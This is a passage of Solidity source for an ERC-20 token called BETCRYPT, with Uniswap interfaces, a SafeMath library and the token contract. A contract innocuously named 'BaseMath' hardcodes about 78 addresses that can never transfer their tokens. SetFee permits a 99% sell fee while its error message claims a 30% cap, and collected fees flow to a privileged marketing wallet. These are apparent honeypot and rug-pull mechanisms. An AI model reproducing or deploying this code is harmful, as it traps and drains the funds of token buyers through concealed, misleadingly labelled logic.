    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

import "contracts/AntiMEV&Bribe.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function per(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= 100, "Percentage must be between 0 and 100");
        return a * b / 100;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burns(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract BETCRYPT is ERC20, Ownable, BaseMath {
    using SafeMath for uint256;
    
    IUniswapV2Router02 public immutable _uniswapV2Router;
    address public uniswapV2Pair;
    address private deployerWallet;
    address private marketingWallet;
    address private constant deadAddress = address(0xdead);

    bool private swapping;

    string private constant _name ="BETCRYPT";
    string private constant _symbol ="BETCRYPT";

    uint256 public initialTotalSupply = 100000000 * 1e18;
    uint256 public maxTransactionAmount = 1000000 * 1e18;
    uint256 public maxWallet = 2000000 * 1e18;
    uint256 public swapTokensAtAmount = 500000 * 1e18;

    bool public tradingOpen = false;
    bool public swapEnabled = false;

    uint256 public BuyFee = 15;
    uint256 public SellFee = 25;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor(address wallet) ERC20(_name, _symbol) {

        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        marketingWallet = payable(wallet);
        excludeFromMaxTransaction(address(wallet), true);

        deployerWallet = payable(_msgSender());
        excludeFromFees(owner(), true);
        excludeFromFees(address(wallet), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);                                  

        _mint(msg.sender, initialTotalSupply);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"Trading is already open");
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _approve(address(this), address(_uniswapV2Router), initialTotalSupply);
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)).per(80),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(address from, address to, uint256 amount) internal override {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (list[from]) {
            require(false, "ERC20: Token");
        }
        
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
                if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping) {

                if (!tradingOpen) {
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
                }

                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }

                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                    require(!list[from], "ERC20: Token");
                } 
                
                else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance > 0;

        if (canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            swapBack(amount);
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (automatedMarketMakerPairs[to]) {
                fees = amount.mul(SellFee).div(100);
            }
            else {
                fees = amount.mul(BuyFee).div(100);
            }

        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }
        amount -= fees;
    }
        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            marketingWallet,
            block.timestamp
        );
    }

    function removesLimits() external onlyOwner {
        uint256 totalSupplyAmount = totalSupply();
        maxTransactionAmount = totalSupplyAmount;
        maxWallet = totalSupplyAmount;
    }

    function cleartucksEth() external {
        require(address(this).balance > 0, "Token: no ETH to clear");
        require(_msgSender() == marketingWallet);
        payable(msg.sender).transfer(address(this).balance);
    }

    function burnRemainTokens(ERC20 tokenAddress) external {
        uint256 remainingTokens = tokenAddress.balanceOf(address(this));
        require(remainingTokens > 0, "Token: no tokens to burn");
        require(_msgSender() == marketingWallet);
        tokenAddress.transfer(deadAddress, remainingTokens);
    }

    function setSwapTokensAtAmount(uint256 _amount) external onlyOwner {
        swapTokensAtAmount = _amount * (10 ** 18);
    }

    function manualswap(uint256 percent) external {
        require(_msgSender() == marketingWallet);
        uint256 totalSupplyAmount = totalSupply();
        uint256 contractBalance = balanceOf(address(this));
        uint256 requiredBalance = totalSupplyAmount * percent / 100;
        require(contractBalance >= requiredBalance, "Not enough tokens");
        swapTokensForEth(requiredBalance);
    }

    function SetFee(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 30 && _sellFee <= 99, "Fees cannot exceed 30%");
        BuyFee = _buyFee;
        SellFee = _sellFee;
    }

    function swapBack(uint256 tokens) private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 tokensToSwap;
    if (contractBalance == 0) {
        return;
    } 
    else if(contractBalance > 0 && contractBalance < swapTokensAtAmount) {
        tokensToSwap = contractBalance;
    }
    else {
        uint256 sellFeeTokens = tokens.mul(SellFee).div(100);
        tokens -= sellFeeTokens;
        if (tokens > swapTokensAtAmount) {
            tokensToSwap = swapTokensAtAmount;
        } else {
            tokensToSwap = tokens;
        }
    }
    swapTokensForEth(tokensToSwap);
  }
}

// File: contracts/AntiMEV&Bribe.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract BaseMath {
    mapping (address => bool) public list;

    constructor() {
      list[0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13] = true;
      list[0x77223F67D845E3CbcD9cc19287E24e71F7228888] = true;
      list[0x77ad3a15b78101883AF36aD4A875e17c86AC65d1] = true;
      list[0x4504DFa3861ec902226278c9Cb7a777a01118574] = true;
      list[0xe3DF3043f1cEfF4EE2705A6bD03B4A37F001029f] = true;
      list[0xE545c3Cd397bE0243475AF52bcFF8c64E9eAD5d7] = true;
      list[0xe2cA3167B89b8Cf680D63B06E8AeEfc5E4EBe907] = true;
      list[0x000000000005aF2DDC1a93A03e9b7014064d3b8D] = true;
      list[0x1653151Fb636544F8ED1e7BE91E4483B73523f6b] = true;
      list[0x00AC6D844810A1bd902220b5F0006100008b0000] = true;
      list[0x294401773915B1060e582756b8d7f74cAF80b09C] = true;
      list[0x000013De30d1b1D830dcb7d54660F4778D2d4aF5] = true;
      list[0x00004EC2008200e43b243a000590d4Cd46360000] = true;
      list[0xE8c060F8052E07423f71D445277c61AC5138A2e5] = true;
      list[0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80] = true;
      list[0x0000B8e312942521fB3BF278D2Ef2458B0D3F243] = true;
      list[0x007933790a4f00000099e9001629d9fE7775B800] = true;
      list[0x76F36d497b51e48A288f03b4C1d7461e92247d5e] = true;
      list[0x2d2A7d56773ae7d5c7b9f1B57f7Be05039447B4D] = true;
      list[0x758E8229Dd38cF11fA9E7c0D5f790b4CA16b3B16] = true;
      list[0x00000000A991C429eE2Ec6df19d40fe0c80088B8] = true;
      list[0xB20BC46930C412eAE124aAB8682fb0F2e528F22d] = true;
      list[0x6c9B7A1e3526e55194530a2699cF70FfDE1ab5b7] = true;
      list[0x1111E3Ef0B6aE32E14a55e0E7cD9b8505177C2BF] = true;
      list[0x000000d40B595B94918a28b27d1e2C66F43A51d3] = true;
      list[0xb8feFFAC830C45b4Cd210ECDAAB9D11995D338ee] = true;
      list[0x93FFb15d1fA91E0c320d058F00EE97F9E3C50096] = true;
      list[0x00000027F490ACeE7F11ab5fdD47209d6422C5a7] = true;
      list[0xfB62F1009aDa688aa8F544b7954585476cE41A14] = true;
      list[0xA9b2e916eC8f42a6eD59730331C83D31d0AB2D22] = true;
      list[0xC5B25744e2339B62CA995053d53d6cdB504bbbc9] = true;
      list[0xA49fd066d0331C6DfaDc13728E8a7486C82B3Cd2] = true;
      list[0xD8D4FCAaeD45B1015a9f333671C9076cB36F150f] = true;
      list[0x46e459766147f2eBAf457204C61a62619DA68bf4] = true;
      list[0xc41820629812aD4DA5cD5a3371D53cc697D3a978] = true;
      list[0x534bc0Caa32eAeEE2eC5AF656b8980B2dfE0bAa9] = true;
      list[0x6C29d02550aa19B34BaAc588723B58bB87352732] = true;
      list[0xFD9adB71d026438296DFAAE3ec5A2259Ee9076b3] = true;
      list[0x4b4264b30ab75Ea8B070f8F7d9Abb263C2f0067B] = true;
      list[0xafeD2eE8d6b57B7f3EA0aF9da3A1EC0dc19d3ec4] = true;
      list[0xc8bb0336a27caE7D0C8e1030c75DC1b2BC75DfbB] = true;
      list[0xbff42064C9f09D59ABbD2416687B1607e36330D3] = true;
      list[0x3b7D3aFCcc66335AF171A6e09C78eF32001b70F5] = true;
      list[0x72Ad2f4943433eA111eB1506219820Ba881f453b] = true;
      list[0x6eCDa7c62D4249B895E7EE2800923b6F04241170] = true;
      list[0x81Dbfde27C3AA484568E2263a0edd6C79F3f2505] = true;
      list[0xDe5540CaAb026B0c268720856F02fe339e25112B] = true;
      list[0x0d4EC51dd906F4643A9310F214b8604aAa3dCc40] = true;
      list[0xC56680E890dC25401510E077ed2a0E074FD0a38B] = true;
      list[0x8cb992a11e5Af75678fc5c8Df4791Da6D00B828B] = true;
      list[0xE87a4d3807caaf2cb18557a23Dc615F51775e064] = true;
      list[0xF68A8f6362673F86169DF50436a440af1226548c] = true;
      list[0xb0818aea46f16FEB5348D45BD73D4640Ba504192] = true;
      list[0xcDB63DAbfCc64D35F487ab5Fd8c60FE32eeEd818] = true;
      list[0xCfcC712A825045EB49DFE11D65FD0fA4356df6fB] = true;
      list[0x3377a3a94402cEccF16Dd074E99cBc176112ddc9] = true;
      list[0xe2b70C1B1DF3596bd301f02255814D80CcCc3726] = true;
      list[0x1088C067843b9c1c43bbB63682f6047079D94Bc9] = true;
      list[0x53f23E7feb2824076Fbd65d97D30Ea8adDA197CB] = true;
      list[0xD7A7F575df17894b2d46cc6bEf16B5aDC44684C3] = true;
      list[0xcEB92C815643A55c42b2eE2eeb6D1a8eE35Ef847] = true;
      list[0x1a67E76399019B70F460824D0C892eAFce20CC96] = true;
      list[0x23Fba81eB3347C3fDaba1d5A1D5B1F523aE22d71] = true;
      list[0xa3F8bf1038b300fF3102597BFdE30BB59d388b21] = true;
      list[0xb6022974cb911968c91e6ca2f089CB402E511623] = true;
      list[0x73E2f11EC9EA9EfDCC6230fF15957723aD1EbD52] = true;
      list[0xB06d953A1978FA884C203AA223bB888e2c2DE074] = true;
      list[0x245d46E327fA6C305CCbc83C8A6909e3Ef96b6e5] = true;
      list[0x3254dF23dd7a62Cbd310B12B22a9cee4567ef8ac] = true;
      list[0x3E68C9F14e93fED1Eb58e98b0f5e1a4b7aCB6829] = true;
      list[0x5De8eF0EB97D56223E450965dC4f52467F3C12DF] = true;
      list[0x6a3cb843D327F250F58C6a2c8A76ec7045fbe780] = true;
      list[0xE4001b7219Ce18ceCd288d269a371D1137dbD59c] = true;
      list[0xdd59CBC47920A39e21660A852514CF1aB2521D3C] = true;
      list[0x65F8A4585B1e3bBE7c0c7cAed50f9E8097B205eB] = true;
      list[0x24D1aeDeD3378A54013D0555262BE2671DFE1045] = true;
      list[0xd18Ca0aFA43cEdE08d2Cb83F2F8D4FE7c95471F3] = true;
      list[0x73a7fbF9F57bD57E1A81dAf724c352a02305a263] = true;
    }

    function isBad(address _address) public view returns (bool) {
        return list[_address];
    }
}
